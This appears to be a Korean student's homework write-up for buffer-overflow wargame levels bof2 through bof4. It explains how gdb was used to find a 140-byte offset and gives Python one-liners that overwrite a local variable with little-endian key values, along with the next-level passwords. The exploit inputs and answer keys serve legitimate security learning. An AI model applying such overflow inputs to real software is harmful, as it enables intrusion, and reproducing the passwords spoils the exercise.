# hw2 (bof2~4)

> bof2
1. bof1과 동일하나 이번엔 gets로 입력받지 않고 argv로 받은 입력값을 vuln()함수의 인자로 넘기고 그 값을 strcpy()함수를 사용하여 buf에 저장한다. 
2. 1번과 동일하게 innocent와 buf가 선언되어 있으니 방식을 buffer overflow를 이용하여 innocent의 값을 key 값 (0x61616161)와 동일하게 만들어준다.

>> 답(bof3.pw): 78ac9531

>> 풀이:

b.p.1: vuln 함수에서 printf()함수에서 $rsp 주소확인

0x7fffffffeaf0

b.p.2: cmp에서 $rdi 주소값 확인

0x7fffffffeb7c

2번에서 구한 주소값 - 1번에서 구한 주소값 = buf와 innocent 사이의 거리
p/d 0x7fffffffeb7c - 0x7fffffffeaf0 = 140

argv로 입력받는 형식임으로 

./bof2 `python -c "print 'A' * 140 + 'aaaa'"`


> bof3
1. 코드는 bof1과 동일하다. 그러나 KEY값이 0x61616161 -> 0x61로 바뀌었다. 이는 little endian 방식을 고려해야한다.

>> 답(bof4.pw): 64869b0d

>> 풀이:

1번과 동일

b.p.1: 0x7fffffffeb00

b.p.2: 0x7fffffffeb8c

차이: 140

innocent는 INT형으로 4 bytes이다. 그러므로 little endian 방식이라면 입력값을 \x61\x00\x00\x00으로 줘야한다.

(python -c "print 'A' * 140 + '\x61\x00\x00\x00'";cat) | ./bof3


> bof4
1. argv를 입력받는 방식
2. argv를 vuln의 인자로 넘겨주고 strcpy(취약점)을 사용한다.
3. 이떄 buffer overflow를 통해 innocent에 key 값(0x12345678)을 저장하는데 이때 중요한 것은 little endian 방식을 사용해서 입력값에 추가한다.

>> 답(bof5.pw): c75cfe84

>> 풀이:

    b.p.1: strcpy 할 때 $rdi 주소값 0x7fffffffeaf0
    b.p.2: cmp 할 때 $rbp - 4 주소값 0x7fffffffeb7c
    bp1과 bp2 차이 = 140

140만큼 Dummy 값 넣어주고 key 값 (0x12345678)이 나오도록 little endian 방식으로 명령어에 byte 단위로 입력한다
-> \x78\x56\x34\x12

    ./bof4 `python -c "print 'A' * 140 + '\x78\x56\x34\x12'"`
